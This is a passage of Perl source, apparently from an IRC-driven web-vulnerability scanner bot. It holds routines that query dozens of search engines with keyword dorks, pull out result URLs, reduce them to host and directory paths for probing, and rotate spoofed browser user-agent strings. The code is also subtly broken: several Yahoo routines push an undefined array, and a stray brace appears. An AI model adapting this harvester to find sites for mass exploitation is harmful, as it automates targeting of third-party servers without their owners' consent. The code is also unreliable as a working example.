for($b=1;$b<=1000;$b+=100){
my $Ya=("http://search.yahoo.nl/search?p=".key($key)."&n=100&fr=sfp&b=$b");
my $Res=query($Ya);
while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
push(@lst,@grep);}}
return @lst;}


sub yahoog(){
my @lst;
my $key = $_[0];
for($b=210;$b<=1000;$b+=210){
my $Ya=("http://search.yahoo.co.in/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=$b");
my $Res=query($Ya);
while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
push(@lst,@grep);}}
return @lst;}

sub yahooh(){
my @lst;
my $key = $_[0];
for($b=410;$b<=1000;$b+=210){
my $Ya=("http://search.yahoo.at/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=$b");
my $Res=query($Ya);
while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
push(@lst,@grep);}}
return @lst;}

sub yahooj(){
my @lst;
my $key = $_[0];
for($b=610;$b<=1000;$b+=210){
my $Ya=("http://br.search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=$b");
my $Res=query($Ya);
while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
push(@lst,@grep);}}
return @lst;}


sub yahooi(){
my @lst;
my $key = $_[0];
for($b=610;$b<=1000;$b+=210){
my $Ya=("http://search.yahoo.de/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=$b");
my $Res=query($Ya);
while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
push(@lst,@grep);}}
return @lst;}

sub yahool(){
my @lst;
my $key = $_[0];
for($b=810;$b<=1000;$b+=210){
my $Ya=("http://search.yahoo.co.uk/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=$b");
my $Res=query($Ya);
while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
push(@lst,@grep);}}
return @lst;}



sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub msnde(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&go=&first=".$b."=Rechercher&mkt=de-de&scope=&FORM=PERE"); 
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub msnlive(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://msn.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub aol(){
my $key=$_[0];
my @lst;
my $pg=0;
for($pg=1; $pg<=50;$pg++) {
my $Lib=("http://search.aol.com/aol/search?query=".key($key)."&page=$pg");
my $Res=query($Lib);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g ){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}


sub aol1(){
my $key=$_[0];
my @lst;
my $pg=0;
for($pg=0; $pg<=100;$pg++) {
my $Lib=("http://search.aol.com/aol/search?query=".key($key)."&page=$pg&filter=false&nt=null&invocationType=topsearchbox.webhome&clickstreamid=-4692113551542614318");
my $Res=query($Lib);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g ){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub aol2(){
my $key=$_[0];
my @lst;
my $pg=0;
for($pg=0; $pg<=100;$pg++) {
my $Lib=("http://suche.aol.de/suche/web/search.jsp?q=".key($key)."&cluster=&normalization_level=a&famFilter=off&lr=lang_de&langRestrict=2&cpi=$pg");
my $Res=query($Lib);
while($Res =~ m/<a href=\"http:\/\/(.+?)\" target=\"_blank\" style=\"font-size:14;text-decoration:underline\">/g ){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub aol3(){
my $key=$_[0];
my @lst;
my $pg=0;
for($pg=0; $pg<=100;$pg++) {
my $Lib=("http://search.aol.co.uk/aol/search?query=".key($key)."&page=$pg&isinit=true&restrict=countryUK&cr=countryUK&userid=3696368980330600879&avtype=&invocationType=hf_aoluk_po_ws_unauth&clickstreamid=3696368980330600877");
my $Res=query($Lib);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g ){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistacom(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://www.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistade(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://de.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistaus(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://us.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}



sub gigablast(){
my $i=0;
my $key= $_[0];
my $pg=10;
my @lst;
my $av=0;
for($b=1;$b<=1000;$b+=10){
my $giga=("http://www.gigablast.com/search?s=".$b."&n=100&sites=&q=".key($key));
my $res=query($giga);
while ($res=~ m/<span class=\"url\">(.+?)\<\/span>/g ){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($b=1;$b<=1000;$b+=10){
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while ($Res=~ m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g ){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub askde(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($b=1;$b<=100;$b+=1){
my $Ask=("http://de.ask.com/web?q=".key($key)."&dm=all&page=".$i);
my $Res=query($Ask);
while ($Res=~ m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g ){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}



sub fireball(){
my $key=$_[0];
my @lst;
for($b=1;$b<=2000;$b+=10){
my $fireball=("http://suche.fireball.de/cgi-bin/pursuit?pag=$b&query=".key($key)."&cat=fb_loc&idx=all&enc=utf-8");
my $Res=query($fireball);
while ($Res=~ m/<a href=\"?http:\/\/(.+?)\//g ){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub web(){
my $key=$_[0];
my @lst;
for($b=1;$b<=50;$b+=1){
my $web=("http://suche.web.de/search/web/?pageIndex=$b&su=".key($key)."&submit.y=11&submit=Suchen&submit.x=51&webRb=countryDE&mc=suche");
my $Res=query($web);
while($Res =~ m/\"? href=\"?http:\/\/(.+?)\"?/g){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub searchcom(){
my $key=$_[0];
my @lst;
for($b=1;$b<=100;$b+=1){
my $sc=("http://www.search.com/search?q=".key($key)."&nav=$b");
my $Res=query($sc);
while ($Res=~ m/<a href=\"?http:\/\/(.+?)/g ){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}


sub search(){
my $key=$_[0];
my @lst;
for($b=1;$b<=500;$b+=1){
my $sch=("http://www.search.ch/search.html?rank=$b&q=".key($key)."&n=100");
my $Res=query($sch);
while ($Res=~ m/<\/div><a href=\"http:\/\/(.+?)\"/g ){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub hotbot(){
my $key=$_[0];
my @lst;
my $pg=0;
for($pg=1; $pg<100;$pg++) {
my $Lib=("http://search.hotbot.co.uk/cgi-bin/pursuit?pag=".$pg."&query=".key($key)."&cat=hb_loc&enc=utf-8&SITE=uk");
my $Res=query($Lib);
while($Res =~ m/<span class=\"green\">(.+?)<\/span>/g ){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub sfgate(){
my $key=$_[0];
my @lst;
for($b=0;$b<=1000;$b+=10){
my $sfgate=("http://www.sfgate.com/cgi-bin/google/search/ws?sort=rank&o=$b&term=".key($key)."&Submit=S");
my $Res=query($sfgate);
while ($Res=~ m/<a target=\"_google\" href=\"http:\/\/(.+?)\"/g ){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub stampa()
{
if ($#_ == '1') {
my $sk = $_[0];
print $sk "$_[1]\n";
} else {
print $sk "$_[0]\n";
}}



sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}   
return @unici;
}

sub http_query($){
my ($url) = @_;
my $host=$url;
my $query=$url;
my $page="";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~s/$host//;
if ($query eq "") {$query="/";};
eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
};
return $page;
}
}




sub Agent(){
	my @ret = (
	"Microsoft Internet Explorer/4.0b1 (Windows 95)",
	"Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)",
	"Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
	"Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)",
	"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Win32)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
	"Microsoft Pocket Internet Explorer/0.6",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)",
	"MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
	"Advanced Browser (http://www.avantbrowser.com)",
	"Avant Browser (http://www.avantbrowser.com)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)",
	"Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)",
	"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",
	"Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox",
	"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0",
	"Mozilla/3.0 (OS/2; U)",
	"Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)",
	"Mozilla/4.61 (Macintosh; I; PPC)",
	"Mozilla/4.61 [en] (OS/2; U)",
	"Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)",
	"Mozilla/4.8 [en] (Windows NT 5.0; U)" );
return(@ret);
}